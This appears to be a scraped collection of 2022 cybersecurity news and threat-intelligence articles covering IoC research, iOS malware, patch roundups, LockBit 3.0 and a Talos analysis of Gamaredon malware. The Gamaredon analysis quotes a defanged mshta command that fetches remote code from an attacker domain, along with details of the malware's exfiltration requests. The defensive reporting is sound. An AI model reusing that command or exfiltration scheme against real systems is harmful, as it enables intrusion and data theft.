said. ""Organisations should seek to establish cyber security expectations with their suppliers, including software vendors. These expectations should be clearly documented in contracts or memorandum of understandings to ensure vendors are appropriately managing their own security posture, including their cyber supply chain risks. ""Organisations should understand what mechanisms vendors have to ensure the integrity and authenticity of the products that they are receiving following purchase."" The spokesperson encouraged agencies ""to speak to vendors if they have concerns about the legitimacy of procured products or software. ""Many vendors can provide customers with helpful information to support clients to avoid counterfeit products,"" they said. ISM controls are formulated by the ACSC “to provide efficient and effective mitigations” to key security risks, according to ISM explanatory notes. It is up to IT and security executives to identify risks that pertain to their environment and then to select and tailor controls as well for their respective use cases.","['acsc', 'authentic', 'counterfeit', 'security']",8b26c583-d8d2-5e6d-9a1f-b3c4da4eab54,"The Australian Cyber Security Centre has inserted new controls into the information security manual (ISM) that demand checks on the “integrity” and “authenticity” of IT purchases. “Applications may benefit from delivery via encrypted communication channels while ICT equipment may benefitfrom tracking and tamper-evident packaging,” it advises.

Years later, the cybersecurity community can still benefit from insights and actionable intelligence relevant to the attack. In line with this, WhoisXML API threat researcher Dancho Danchev dove deep into the DNS system intrusion using publicly available indicators of compromise (IoCs). We further enriched his findings, allowing us to uncover: A sample of the additional artifacts obtained from our analysis is available for download from our website . Danchev’s investigation began with 103 cyber resources tagged as IoCs in the DNC breach, consisting of seven IP addresses, 83 domains and subdomains, and 13 email addresses. Reverse IP API revealed that the IP addresses no longer resolved to live properties, but 12 domains still actively resolved to IP addresses as of 29 August 2022. On the other hand, the email addresses known to have been involved in the campaign have been used to register more than 10,000 domains, giving us an infrastructure comprising 11,048 IoCs and related artifacts. We looked at these properties under our DNS microscope. Details of our findings are below. About 30% of the digital properties in the study were registered with Gname.com Pte. Ltd., a Singapore-based domain registrar. GoDaddy and DropCatch followed with 12% and 7%, respectively. The rest of the top 10 registrars are shown in the chart below. On the other hand, the largest concentration of resolving properties pointed to EGI Hosting as the Internet service provider (ISP). The other ISPs that made up the top 10 were Google, Peg Tech, Eonix, Cloudflare, Cnservers, Cogent Communications, Multacom Corporation, Leaseweb, and Federal Online Group. The chart below shows the ISP distribution. We looked at two types of locations for the digital properties involved in the DNC breach. Through Bulk IP API, we discovered that more than a quarter of the resolving properties were geolocated in the U.S. However, the domain registrations mostly came from China (59.9%). Only about 30.6% were registered in the U.S. We also aimed to determine how these properties were represented in malware detection engines. Out of over 10,000 domains connected to the campaign via registrant email addresses, only 80 were reported as malicious. Only one of the initial IoCs was flagged as malicious. As previously mentioned, more than half of the artifacts and a dozen IoCs still had active resolutions. While most of them were parked, several hosted adult and gambling content. We also found quite a few with, or redirecting to, news-related content and mentioning the domains themselves had expired and were available for sale again. Below are some examples. Other properties hosted or redirected to suspicious pages that could potentially serve as vehicles for credential theft, such as the following: We have expanded 100 publicly available DNC breach IoCs and uncovered more than 10,000 artifacts by looking at DNS and WHOIS connections.

What to know about iOS security,André Lameiras,2022-09-19,"Here are some of the most common ways that an iPhone can be compromised with malware, how to tell it’s happened to you, and how to remove a hacker from your device Let’s be clear: if your iPhone or iPad is connected to the internet, there’s a risk it might get hacked. Sure, statistics seem to support the idea that your iOS device is pretty safe (and Apple keeps adding new safety features ), but your security largely hinges on how you actually use the device. In this article, we’ll look at some of the most common ways for malware to compromise iPhones, some warning signs your own phone may have been hacked, and how to ‘fight back’. One of the biggest complaints about iOS is how slow the operating system is in adopting features that have long been present on Android devices. So to overcome this, some users resort to an option that goes against Apple’s Terms and Conditions: they jailbreak their phone. This bypasses the built-in limitations to content from Apple’s App Store, allowing users to sideload apps and widgets from third-party stores. Sideloading – the act of getting an app from an unofficial store – can also be done by downloading it directly through a website on Safari or any other browser. While allowing, or not, access to content from third-party stores can be debatable , as of now, only the applications on the App Store have been officially reviewed for safety. Meanwhile, the risks are clear: when installing a non-verified app, you are giving it unrestricted access to your device. Apple’s official store on your iOS device is generally known for providing safe content. Any application made available on the App Store has gone through a process that checked for bugs, privacy policy concerns, identification of third-party ad providers, and licensing requirements. But sometimes a bad app(le) slips through the safety net. And a simple calendar event spam, a malicious link shared via messaging apps, or an aggressive advertisement displayed while browsing a website can open the App Store and suggest that you to install one of these inaccurately reviewed apps. And because they are on the official store, there’s no reason to doubt their authenticity, right? Wrong. Such a dodgy app will try to cash in by, for example, selling you something you don’t need (and that doesn’t work) using Apple’s own in-app purchase system. Fake Antivirus found on Apple's App Store charges €134,99 per 3 months for removing non existing viruses. Delivered via scareware ads, results in subscription scam. More about the research: https://t.co/oqL80J3BNR https://t.co/IfwBD1KAdd — Lukas Stefanko (@LukasStefanko) August 5, 2021 Your iPhone’s Calendar app might seem like the safest place on your device, but it is actually one of the most common ways to distribute malware on iOS. Just like anyone you’ve just met can send you a Calendar invitation for a coffee later that week, hackers can do the same! These unwanted invites can come from leaked email addresses or from you after unintentionally subscribed to calendar events on dodgy websites. Remember that scams are designed for people to fall for them. So in case you do, unsubscribe from the calendar and never tap on individual events you don’t know and trust as they will lead you to more spam. Figure 1. Scam website requests a user to subscribe to calendar events on iOS Back in 2010, Apple made it possible to add configuration profiles to its iOS devices. This way, companies could manage on their iPhones a series of specific settings and functions as well as install apps used internally that do not need to be publicly available on the App Store. While this is a useful tool for the legitimate use of companies and schools, hackers learned to take advantage of this feature . As usual, through phishing attacks and social engineering traps, hackers can lead their victims into tapping a link that will install a malicious configuration profile, granting them access to your Wi-Fi, VPN settings, app management, or internet traffic. More than just the privacy and safety risks posed by this kind of threat, most users are not aware of profile management options, giving hackers the time needed to explore and exploit user’s password, steal banking information, or even install spyware . Figure 2. Malicious cryptocurrency wallet app installed via a configuration profile If getting spam on your calendar sounds like a minor risk, having someone tracking you might sound much worse. But the most vicious thing about this type of hacking is that they are all interconnected. What was initially a small spam event invitation can easily escalate to installing a sideloaded app or a malicious configuration profile. Bear in mind that your phone can also fall in the wrong hands without you noticing. This can be particularly sensitive in the context of abusive relationships. Stalkerware – a tool used to access your devices remotely – can be installed on your phone without your consent. Attackers can then target your personal information on iCloud, track your location, or access your photos and notes. If you suspect or fear your iPhone has been hacked, there’s a few things you can check to start with: Figure 3. One of the two apps is an imposter (source: ESET research ) Figure 4. Giving an iPhone a fresh start Everybody can fall victim to a cyberattack, but you can minimize your risks by following a few simple steps. In the end, no matter how likely you are to get hacked, it’s important to understand the risks and implement a few simple precautions. Avoiding to jailbreak your device, refraining from tapping on unfamiliar links. and using multi-factor authentication wherever it’s available will go a long way towards protecting your device and your data.",['Mobile Security'],fa4f5919-e419-53e3-a157-f358b7a49836,"In this article, we’ll look at some of the most common ways for malware to compromise iPhones, some warning signs your own phone may have been hacked, and how to ‘fight back’.

We can’t live without them, after all, if we are to thrive and not just survive in the digital world. Our research delved into web properties that threat actors may have or plan to weaponize to lure in as many potential victims as possible. Our deep dive into the most-impersonated software in malware attacks revealed: A sample of the additional artifacts obtained from our analysis is available for download from our website . VirusTotal recently identified 7-Zip, TeamViewer, CCleaner, Microsoft Edge, Steam, Zoom, and WhatsApp as the most-mimicked software brands in malware attacks. That’s not surprising given their huge user bases. We put these brands under the Domain Name System (DNS) satellite to gauge how many web properties there are that may be riding on their popularity. We began our investigation by using the following strings to look for domains and subdomains potentially imitating the seven software’s developers via Domains & Subdomains Discovery : Given the commonality of some of the strings (i.e., “steam” and “zoom”), however, note that our dataset for the two brands may contain several false positives. That said, the search led to the discovery of 20,751 domains. A bulk WHOIS lookup for these domains showed that only nine belonged to two of the legitimate brand owners—Zoom and WhatsApp—based on the registrant email addresses indicated in their WHOIS records. These are shown in the table below. Closer scrutiny of the domains’ WHOIS records also revealed that a majority were recently created—in the 2020s—a far cry from the legitimate company domains’ creation dates, which fell between 1991 (microsoft[.]com) and 2008 (whatsapp[.]com). A bulk malware check for the cybersquatting domains via Threat Intelligence Platform (TIP) also showed that 992 were involved in malware and spam distribution. DNS lookups for the domains revealed that they resolved to 12,615 unique IP addresses scattered across 76 countries led by the U.S., Canada, Germany, the Netherlands, Russia, Australia, Guinea, the U.K., France, and Hong Kong as shown in the following map. Subjecting 10% or about 1,200 of the total IP address resolution volume to TIP malware checks showed that 111 were malicious. Our search for potential cybersquatting subdomains, meanwhile, led to the discovery of 28,808 web properties, 944 of which were dubbed “malicious” by various malware engines. Overall, Steam, Zoom, and WhatsApp topped the list of the most-imitated software based on the volume of domains and subdomains containing their brand names. The specific numbers are shown in the table below. Our digital footprinting study supports the VirusTotal findings—these seven brands are indeed heavily being imitated. What’s more, only nine out of close to 50,000 web properties belonged to the legitimate companies and at least 5% of the domains and subdomains containing the brands were flagged as malicious and shouldn’t be accessed.

As with previous roundups, this post isn't meant to be an in-depth analysis. Instead, this post will summarize the threats we've observed by highlighting key behavioral characteristics, indicators of compromise, and discussing how our customers are automatically protected from these threats. As a reminder, the information provided for the following threats in this post is non-exhaustive and current as of the date of publication. Additionally, please keep in mind that IOC searching is only one part of threat hunting. Spotting a single IOC does not necessarily indicate maliciousness. Detection and coverage for the following threats is subject to updates, pending additional threat or vulnerability analysis. For the most current information, please refer to your Firepower Management Center, Snort.org , or ClamAV.net . For each threat described below, this blog post only lists 25 of the associated file hashes and up to 25 IOCs for each category. An accompanying JSON file can be found here that includes the complete list of file hashes, as well as all other IOCs from this post. A visual depiction of the MITRE ATT&CK techniques associated with each threat is also shown. In these images, the brightness of the technique indicates how prevalent it is across all threat files where dynamic analysis was conducted. There are five distinct shades that are used, with the darkest indicating that no files exhibited technique behavior and the brightest indicating that technique behavior was observed from 75 percent or more of the files.

Cisco Talos recently identified a new, ongoing campaign attributed to the Russia-linked Gamaredon APT that infects Ukrainian users with information-stealing malware. The adversary is using phishing documents containing lures related to the Russian invasion of Ukraine. LNK files, PowerShell and VBScript enable initial access, while malicious binaries are deployed in the post-infection phase. We discovered the use of a custom-made information stealer implant that can exfiltrate victim files of interest and deploy additional payloads as directed by the attackers. Cisco Talos discovered Gamaredon APT activity targeting users in Ukraine with malicious LNK files distributed in RAR archives. The campaign, part of an ongoing espionage operation observed as recently as August 2022, aims to deliver information-stealing malware to Ukrainian victim machines and makes heavy use of multiple modular PowerShell and VBScript (VBS) scripts as part of the infection chain. The infostealer is a dual-purpose malware that includes capabilities for exfiltrating specific file types and deploying additional binary and script-based payloads on an infected endpoint. The adversary uses phishing emails to deliver Microsoft Office documents containing remote templates with malicious VBScript macros. These macros download and open RAR archives containing LNK files that subsequently download and activate the next-stage payload on the infected endpoint. We observed considerable overlap between the tactics, techniques and procedures (TTPs), malware artifacts and infrastructure used in this campaign and those used in a series of attacks the Ukraine Computer Emergency Response Team (CERT-UA) recently attributed to Gamaredon . We also observed intrusion attempts against several Ukrainian entities. Based on these observations and Gamaredon's operational history of almost exclusively targeting Ukraine, we assess that this latest campaign is almost certainly directly targeting entities based in Ukraine. Attack Chain Initial Access Gamaredon APT actors likely gained initial footholds into targeted networks through malicious Microsoft Office documents distributed via email. This is consistent with spear-phishing techniques common to this APT. Malicious VBS macros concealed within remote templates execute when the user opens the document. The macros download RAR archives containing LNK files. The naming convention of the RAR archives in this campaign follows a similar pattern: 31.07.2022.rar 04.08.2022.rar 10.08.2022.rar These compressed archives usually contain just the LNK file. The LNK files and Microsoft Office document names contain references pertinent to the Russian invasion of Ukraine: Execution Once opened, the LNKs will attempt to execute MSHTA.EXE to download and parse a remote XML file to execute a malicious PowerShell script: mshta.exe hxxp://a0704093.xsph[.]ru/bass/grudge.xml /f Gamaredon is known to use the domain xsph[.]ru. The servers in this campaign only allow access from IP addresses inside the Ukrainian address space. This PowerShell script decodes and executes a second PowerShell script (instrumentor), which collects data from the victim and reports back to a remote server. This script also allows the remote server to send a PowerShell command or binary blob containing encrypted VBScript (VBS) code to be executed locally: Second-stage PowerShell script that runs additional commands and payloads on the endpoint. The instrumentor PowerShell script usually consists of a function that decodes the encrypted response from the command and control (C2) server and executes it as a VBScript object. The key used in the XOR decoder is calculated based on the machine's volume serial number plus index parameters passed in the response blob. This method makes it difficult to decode the malicious content if an observer looking at the data doesn't have both parameters available. The PowerShell script also repeatedly captures the current user's screen. This code uses the "" System.Windows.Forms "" object to capture a copy of the virtual desktop, including setups with multiple screens. The screen capture is executed nine times, but the resulting screenshot is always saved to "" %TEMP%\test.png "", which gets overwritten every time. The resulting image (PNG file) is then converted to a base64-encoded string, stored in a variable and the screenshot image file is removed from the disk. The script then proceeds to upload the victim's information to the remote server. The following information is then collected and exfiltrated to a hardcoded C2 URL: Computer name. Volume serial number. Base64-encoded screenshot. Upon sending the system information, the server response is parsed to see if there are commands to be executed. The entire script runs up to four times, thus up to four different commands can be executed each time. The code checks if the first character is an exclamation point (""!""). If so, the remainder of the response is expected to be a PowerShell code that is passed directly to the command IEX . The output of that command is then added to the variable ""cmd"" and sent back to the C2 server. If the response starts with any other character, it is treated as an encrypted blob and passed to the decoder function, along with the volume serial number to be decoded and executed as VBScript. Infection chain diagram. Payloads Yet another PowerShell script One of the payloads served to the instrumentor script was PowerShell code used to set an environmental variable with PowerShell code in it and a Registry RUN key to run every time the user logs in. PowerShell script setting up the RUN key to execute another PowerShell script stored in the environment variable. There are two key components to this script: The Get-IP function: This function queries a DNS lookup service for an attacker-specified domain and uses one of the returned IP addresses as the IP to download the next payloads. Next-stage payload: The PowerShell script uses the IP address to construct a URL that serves the next-stage PowerShell script, which is subsequently stored in "" $env:Include "" and executed when the user logs in (via the HKCU\\Run key). Persistence script fetching the remote location's IP. The PowerShell code residing in the environment variable is meant to provide the attackers with continued access to the infected endpoint with the capability to deploy additional payloads as desired. A similar PowerShell script was described in CERT-UA's recent alert describing intrusions conducted by Gamaredon in the first half of 2022 using the GammaLoad and GammaSteel implants. PowerShell script stored in the env variable. This script uses the same Get-IP() function to get a random IP assigned to the domain and queries a URL constructed from the IP address and a hardcoded extended resource. Just like the previous script, the computer name and volume serial number are used again in communications with the C2 server. The C2 server uses them to encode the next-stage payload subsequently served to the script. If the response from the C2 starts with the string "" http "", the content is treated as the URL to download the final payload binary. The Volume Serial Number and Computer Name are passed to this URL and the response is decoded using the XorBytes function. PowerShell function used to decode payloads from C2 server. The decrypted binary is then saved to the "" %TEMP% "" folder with a name consisting of a random string of numbers and the "" .exe "" file extension and is executed. Alternatively, if the response from the C2 does not begin with the "" http "" string, the content is treated as a VBS and executed via a COM object. Infostealer One of the executables deployed by the attackers via the PowerShell script consisted of an information stealer that exfiltrates files of specific extensions from the infected endpoint: .doc, .docx, .xls, .rtf, .odt, .txt, .jpg, .jpeg, .pdf, .ps1, .rar, .zip, .7z and .mdb. This is a new infostealer that Gamaredon has not previously used in other campaigns. We suspect it may be a component of Gamaredon's ""Giddome'' backdoor family, but we are unable to confirm that at this time. The malicious binary keeps track of what has been exfiltrated in a file named "" profiles_c.ini "" in the "" %USERPROFILE%\Appdata\Local "" folder. The malware stores the MD5 hash of a string containing the filename, file size and modification date of the exfiltrated file. Once started, the malware scans all attached storage devices looking for files with the aforementioned extensions. For each one, the malware makes a POST request with metadata about the exfiltrated file and its content. POST data to exfiltrate files. The parameter ""p"" contains metadata about the stolen file and the victim machine using the following format: %u&&%s&&%s&&%s&&%s&&%s Where the various parameters are: <Hard_coded_value>&&<File_name>&&<File_Modification_Date_time>&&<FileSize>&&__&&<Computer_Name>&&<Username>&&<Victim_ID_randomly_generated_string_12_chars>&&<Volume Serial Number> The raw content of the file comes after the metadata. The request is made to a random URI under the parent C2 domain. The implant generates a random 12-character string that acts as a subdomain for the C2 domain to send requests to: E.g. <random_12_char_string>[.]celticso[.]ru The implant will also search for the relevant file extensions in fixed and remote drives and specifically in the ""C:\Users"" folder. The implant enumerates all the files recursively in the directories on the system while avoiding enumeration of any folder containing the following strings in the path: program files program files (x86) programdata perflogs prog windows appdata local roaming Avoiding these folders is likely an attempt by the malware to avoid exfiltrating system files thereby focussing on user files of interest only. For each file exfiltrated to the C2, the implant calculates the MD5 hash for the following information and stores it in the "" %LocalAppData%\profiles_c.ini "" file: <file_path><File_size><File_modification_date_time> The implant also steals files from removable drives connected to the infected endpoint. When the implant finds a removable drive, it looks for files with the file extensions listed earlier. Once a file is found, the implant creates a randomly named folder in the %TEMP% directory and copies the original file from its original location to: %Temp%\<randomly_named_folder>\connect\<removable_vol_serial_number>\<original file path> For example, a user file found in a remote drive ""E:"" at path "" E:\top_secret_docs\isengard.doc "" will be copied to ""%temp%\randomly_named_folder\connect\<removable_vol_serial_number>\top_secret_docs\isengard.doc"" The contents of the folder in the temp directory are subsequently exfiltrated to the C2. Deliver payloads As with this actor's previous tools (e.g., the PS1 scripts), this binary also parses the server response and downloads additional payloads if requested. The response from the server consists of a flag indicating how the data should be treated: Flag Payload Type Action 1 EXE Written to disk and executed. 2 VBS Written to disk and executed using wscript.exe. Any other value Blob of data Written to a file on disk in the %TEMP% folder. Code depicting the dropping of additional payloads.

Since it runs on a bundled version of Linux, it inherits vulnerabilities from the upstream operating system and its utilities, and in this update , Dell announces patches for 25 of them. Two of these, CVE-2022-29155 and CVE-2022-1586 , are rated critical. CVE-2022-29155 is an SQL injection vulnerability in OpenLDAP v2.x. The vulnerability “exists in the experimental back-sql backend to slapd, via a SQL statement within an LDAP query. This can occur during an LDAP search operation when the search filter is processed, due to a lack of proper escaping.” CVE-2022-1586 is an out-of-bounds read vulnerability. It’s a “unicode property matching issue in JIT-compiled regular expressions”, within the PCRE2 library. Another two of the bugs are rated high severity: CVE-2022-1304 and CVE-2022-1271 . The ext2, ext3 and ext4 file system utility e2fsprogs is subject to CVE-2022-1304, a segmentation fault that could offer arbitrary code execution. CVE-2022-1271 is a bug in zgrep, a GNU utility that allows string searchers on compressed files. “When zgrep is applied on the attacker's chosen file name (for example, a crafted file name), this can overwrite an attacker's content to an arbitrary attacker-selected file,” the zgrep advisory stated. “This flaw allows a remote, low privileged attacker to force zgrep to write arbitrary files on the system.” The Dell updated includes patches for 16 kernel firmware bugs of lower impact, along with fixes for curl, Jenkins, and libxml2.","['dell', 'linux', 'security', 'vmware', 'vproxy']",86aa0391-2d83-5748-a317-e607a2a197b5,"Dell has issued patches for two critical flaws in its vProxy software, as part of a wide-ranging fix for its upstream Linux operating system. “When zgrep is applied on the attacker's chosen file name (for example, a crafted file name), this can overwrite an attacker's content to an arbitrary attacker-selected file,” the  researcher advisory stated."

Microsoft’s advisory says CVE-2022-37969 has an exploit circulating in the wild. It’s an elevation of privilege vulnerability in the Windows Common Log File System Driver, and while it’s only locally exploitable, it gives the attacker system-level privileges. The on-premises version of Microsoft Dynamics CRM has two critical-rated vulnerabilities: CVE-2022-35805 and CVE-2022-34700 . Both of them allow an authenticated user to “run a specially crafted trusted solution package to execute arbitrary SQL commands,” Microsoft’s advisory states. “From there the attacker could escalate and execute commands as db_owner within their Dynamics 365 database.” Two remote code execution (RCE) bugs affect Windows Internet Key Exchange protocol extensions. Designated CVE-2022-34721 and CVE-2022-34722 , the bugs affect any Windows machine with IPSec enabled. They can be exploited remotely by an unprivileged attacker, without user interaction. The SANS Institute’s Renato Marinho wrote : “This vulnerability brings together the characteristics of a wormable vulnerability that you should give attention to and apply the patch as soon as possible.” Windows’ IPv6 implementation is vulnerable to RCE via CVE-2022-34718 , which can be attacked using a crafted IPv6 packet sent to a Windows machine with IPSec enabled. Marinho noted that this is also wormable, but only affects systems running the IPSec service.

Tracked as CVE-2022-3180 (CVSS score: 9.8), the issue is being weaponized to add a malicious administrator user to sites running the WPGateway plugin, WordPress security company Wordfence noted. ""Part of the plugin functionality exposes a vulnerability that allows unauthenticated attackers to insert a malicious administrator,"" Wordfence researcher Ram Gall said in an advisory. WPGateway is billed as a means for site administrators to install, backup, and clone WordPress plugins and themes from a unified dashboard. The most common indicator that a website running the plugin has been compromised is the presence of an administrator with the username ""rangex."" Additionally, the appearance of requests to ""//wp-content/plugins/wpgateway/wpgateway-webservice-new.php?wp_new_credentials=1"" in the access logs is a sign that the WordPress site has been targeted using the flaw, although it doesn't necessarily imply a successful breach. Wordfence said it blocked over 4.6 million attacks attempting to take advantage of the vulnerability against more than 280,000 sites in the past 30 days. Further details about the vulnerability have been withheld owing to active exploitation and to prevent other actors from taking advantage of the shortcoming. In the absence of a patch, users are recommended to remove the plugin from their WordPress installations until a fix is available. The development comes days after Wordfence warned of in-the-wild abuse of another zero-day flaw in a WordPress plugin called BackupBuddy. The disclosure also arrives as Sansec revealed that threat actors broke into the extension license system of FishPig , a vendor of popular Magento-WordPress integrations, to inject malicious code that's designed to install a remote access trojan called Rekoobe .",['Malware'],8dffb57a-52b1-549c-9b22-6ea5975b5252,"A zero-day vulnerability in the latest version of a WordPress premium plugin known as WPGateway is being actively exploited in the wild.

That’s exactly what the XCSSET malware operators have done for their campaigns targeting macOS users to continue working. When macOS Monterey removed support for Python, so did XCSSET , which relied heavily on the language in the past. Otherwise, related campaigns won’t work against the users of the latest macOS. Using the eight domains and one IP address identified by SentinelOne as indicators of compromise (IoCs) as a jump-off point, we discovered: A sample of the additional artifacts obtained from our analysis is available for download from our website . We began our in-depth look at XCSSET by subjecting the eight domains identified as IoCs to Connected Domains API lookups and found that seven of them resolved to 45[.]82[.]153[.]92—also named an IoC. Only cosmodron[.]com didn’t resolve to the IP said address at any point in time. Using 45[.]82[.]153[.]92 as a reverse IP lookup search string, meanwhile, allowed us to uncover an additional nine domains that haven’t been mentioned in XCSSET-related reports. These are: We didn’t stop there, though, since we want to identify as many artifacts as possible to help users better protect against ongoing malicious campaigns. We then sought to find domains that used the same strings as the IoCs and additional artifacts albeit different top-level domain (TLD) extensions. Using the strings “superdocs,” “melindas,” “kinksdoc,” “gurumades,” “gismolow,” “appledocs,” “adobefile,” “cosmodron,” “admobs,” “linebrand,” “melodyapps,” “monotel,” “nodeline,” “sidelink,” “statsmag,” and “yahooads” as Domains & Subdomains Discovery search strings. That led to the discovery of 126 more artifacts. Performing a bulk WHOIS lookup for all the domains found so far then uncovered six unredacted personal email addresses used to register the properties. These are: Using these email addresses as reverse WHOIS search strings allowed us to uncover 900 additional domains. After collating a total of 1,035 artifacts that haven’t been publicized in XCSSET-related reports, we ran them through a bulk malware check on Threat Intelligence Platform (TIP) . We found that 23 of them hosted malware. While the removal of support for Python on macOS Monterey may have stopped old XCSSET versions from affecting users, the malicious operators’ fast adaptation ensures the latest iteration of their malware will. Security teams who wish to protect networked-connected Macs from XCSSET may be interested in monitoring access to and from the 1,000+ domains we identified as artifacts and block access to the 23 malicious domains.

The group behind the threat typically attacks critical infrastructures such as health systems, including hospitals. LockBit 2.0 overview Looking at the LockBit 2.0 website, more than 850 victims were affected in 2022 by this ransomware, a clear sign of the damage and impact caused by the LockBit operators during their wild campaigns. Criminals claim that they damaged at least 12,125 companies during the LockBit 2.0 version, seen below. Figure1: Total of compromised companies by LockBit 2.0 version. According to the PaloAlto publication , the USA, Italy, Germany, Canada and France are the top five most affected countries by LockBit 2.0 campaigns, with criminals causing a huge global impact. Figure 2: Top 10 impacted countries by LockBit 2.0 ( source ). LockBit 3.0 release With the introduction of the new release of LockBit ransomware (version 3.0), significant capabilities were implemented, including a bug bounty program and Zcash payments. Although there are no official numbers about incidents related to this new version, criminals decided to change in June to the LockBit 3.0, and some victims can be found on the group website. Figure 3: LockBit 3.0 victims. The ransomware notes are no longer named “ Restore-My-Files.txt ” but were moved to a new format: [id].README.txt , as presented below. Figure 4: Ransomware note of LockBit 3.0 version. Also, a new desktop wallpaper is introduced by criminals in this fresh release, as shown in Figure 5. LockBit 2.0 desktop wallpaper ( source ) LockBit 3.0 desktop wallpaper Figure 5: Differences between LockBit 2.0 and 3.0 desktop wallpaper. Notable capabilities introduced in version 3.0 LockBit 3.0 operators introduced a lot of fresh capabilities in this 3.0 version, including: Anti-detection mechanisms to evade AV and EDR systems LockBit 3.0 relies on an “access token” to be supplied as a parameter upon execution A command line option with possible parameters was also introduced The new version is more evasive and faster than the older versions, according to malware experts A fresh anti-debug feature added A mechanism for disabling the Windows Defender and tempering the Windows Event Logs is also present. After executing, LockBit 3.0 tries to disable the Windows Defender to prevent its detection, as mentioned above. Figure 6: LockBit 3.0 disables Windows Defender during its execution. Within some features observed, criminals also introduced a bounty program bug. This is the first bug bounty program released by a ransomware group that encourages researchers to submit security reports for rewards ranging between $1,000 and $1 million. “ We invite all security researchers and ethical and unethical hackers on the planet to participate in our bug bounty program. The amount of remuneration varies from $1,000 to $1 million. ” Figure 7: Bug bounty program offered by LockBit operators. The ransomware gang will also reward “brilliant ideas” to improve its operations. As expected, this bug bounty program differs from traditional and legitimate programs. The available categories are presented below. Website bugs: XSS vulnerabilities, MySQL injections, getting a shell to the site and more will be paid depending on the bug’s severity. The main direction is to get a decryptor through the bug’s website and access the history of correspondence with encrypted companies. Locker bugs: Any errors during encryption by lockers that lead to corrupted files or the possibility of decrypting files without a decryptor. Brilliant ideas: We pay for ideas; please write us about how to improve our site and software; the best ideas will be paid for. What is so interesting about our competitors that we don’t have? Doxing: We pay exactly $1 million, no more and no less, for doxing the affiliate program boss. Whether you’re an FBI agent or a very clever hacker who knows how to find anyone, you can write us a TOX messenger, give us your boss’s name, and get $1 million in bitcoin or monero. TOX messenger: Vulnerabilities of TOX messenger that allow you to intercept correspondence, run malware, determine the IP address of the interlocutor and other interesting vulnerabilities. Tor network: Any vulnerabilities which help to get the IP address of the server where the site is installed on the onion domain, as well as getting root access to our servers, followed by a database dump and onion domains. Figure 8: Bug bounty categories present on the LockBit 3.0 website. The addition of Zcash as a payment option is another of the new features present in this new release. In detail, Zcash is a privacy coin, making it harder to trace and the perfect payment method for illegal purposes. Prevention measures Although there is no magic formula to stop ransomware in general, we can deliver a set of steps to reduce the risk of an incident of this nature. Create offline backups and frequently maintain backup and restoration. Test the procedure periodically. Create a zero-trust architecture with VLAN segregation to isolate DMZ from valuable assets and make lateral movement hard. Implement multi-factor authentication mechanisms on-premises and online/cloud Enforce the password policy to a strong and complex model (e.g., more than 10 chars at least). Use endpoint services such as EDR and AV. Remove unnecessary access to administrative shares on the internal network. Be careful with RDP exposed to the internet. Use canary files/tokens to detect ransomware early. Finally, be proactive and perform cybersecurity assessments to find and mitigate weaknesses to prevent attacks in the wild, both from the external and internal perspectives.

Microsoft released its monthly security update Tuesday, disclosing 64 vulnerabilities across the company’s hardware and software line, a sharp decline from the record number of issues Microsoft disclosed last month. September's security update features five critical vulnerabilities, 10 fewer than were included in last month’s Patch Tuesday. There are two moderate-severity vulnerabilities in this release and a low-security issue that’s already been patched as a part of a recent Google Chromium update. The remainder is considered “important.” The most serious vulnerability exists in several versions of Windows Server and Windows 10 that could allow an attacker to gain the ability to execute remote code (RCE) by sending a singular, specially crafted IPv6 packet to a Windows node where IPSec is enabled. CVE-2022-34718 only affects instances that have IPSec enabled. This vulnerability has a severity score of 9.8 out of 10 and is considered “more likely” to be exploited by Microsoft. Microsoft disclosed one vulnerability that's being actively exploited in the wild — CVE-2022-37969 . Microsoft's advisory states this vulnerability is already circulating in the wild and could allow an attacker to gain SYSTEM-level privileges by exploiting the Windows Common Log File System Driver. The adversary must first have the access to the targeted system and then run specific code, though no user interaction is required. CVE-2022-34721 and CVE-2022-34722 also have severity scores of 9.8, though they are “less likely” to be exploited, according to Microsoft. These are remote code execution vulnerabilities in the Windows Internet Key Exchange protocol that could be triggered if an attacker sends a specially crafted IP packet. Two other critical vulnerabilities, CVE-2022-35805 and CVE-2022-34700 exist in on-premises instances of Microsoft Dynamics 365. An authenticated attacker could exploit these vulnerabilities to run a specially crafted trusted solution package and execute arbitrary SQL commands. The attacker could escalate their privileges further and execute commands as the database owner. Talos would also like to highlight five important vulnerabilities that Microsoft considers to be “more likely” to be exploited: CVE-2022-37957 — Windows Kernel Elevation of Privilege Vulnerability CVE-2022-35803 — Windows Common Log File System Driver Elevation of Privilege Vulnerability CVE-2022-37954 — DirectX Graphics Kernel Elevation of Privilege Vulnerability CVE-2022-34725 — Windows ALPC Elevation of Privilege Vulnerability CVE-2022-34729 — Windows GDI Elevation of Privilege Vulnerability A complete list of all the vulnerabilities Microsoft disclosed this month is available on its update page. In response to these vulnerability disclosures, Talos is releasing a new Snort rule set that detects attempts to exploit some of them. Please note that additional rules may be released at a future date and current rules are subject to change pending additional information. Cisco Secure Firewall customers should use the latest update to their ruleset by updating their SRU. Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. The rules included in this release that protect against the exploitation of many of these vulnerabilities are 60546, 60547, 60549, 60550 and 60552 - 60554. We've also released Snort 3 rules 300266 - 300270.",['Microsoft Patch Tuesday'],b2d1f6c1-0f2f-586f-b4ef-f14bb855611f,"Microsoft released its monthly security update Tuesday, disclosing 64 vulnerabilities across the company’s hardware and software line, a sharp decline from the record number of issues Microsoft disclosed last month.

Take a break from your regularly scheduled activities and join us as we review the details of their latest security offerings. Adobe Patches for September 2022 For September, Adobe released seven patches addressing 63 in Adobe Experience Manager, Bridge, InDesign, Photoshop, InCopy, Animate, and Illustrator. A total of 42 of these bugs were reported by ZDI Sr Vulnerability Researcher Mat Powell. The update for InDesign is the largest patch this month, with eight Critical-rated and 10 Important-rated vulnerabilities receiving fixes. The most severe of these could lead to code execution if a specially crafted file is opened on an affected system. The patch for Photoshop fixes 10 CVEs, nine of which are rated Critical. Again, an attacker can get code execution if they can convince a user to open a malicious file. The fix for InCopy fixes five similar code execution bugs and two info disclosure bugs. Adobe Animate also receives patches for two Critical-rated code execution bugs. The update for Adobe Bridge corrects 10 Critical-rated code execution bugs and two Important-rated info disclosure bugs. One of the three Illustrator vulnerabilities getting patched could also lead to code execution. As with the bugs previously mentioned, a user would need to open a malicious file with an affected software version. Finally, the patch for Adobe Experience Manager addresses 11 Important-rated bugs, primarily of the cross-site scripting (XSS) variety. None of the bugs fixed by Adobe this month are listed as publicly known or under active attack at the time of release. Adobe categorizes these updates as a deployment priority rating of 3. Apple Patches for September 2022 Yesterday, Apple released updates for iOS, iPadOS, 